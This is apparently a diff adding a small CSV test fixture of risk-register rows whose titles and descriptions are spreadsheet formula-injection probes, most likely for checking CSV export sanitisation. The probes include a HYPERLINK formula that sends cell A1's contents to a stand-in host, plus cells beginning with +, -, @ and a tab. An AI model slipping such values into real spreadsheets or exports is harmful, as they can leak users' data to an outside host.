@@ -1,0 +1,4 @@
+id,title,description,likelihood,impact
+R-1,"=HYPERLINK(""https://example.invalid/?""&A1,""click"")",ordinary,3,3
+R-2,+1+1,"@SUM(A1:A9)",4,2
+R-3,-2+3,"	leading tab",2,4
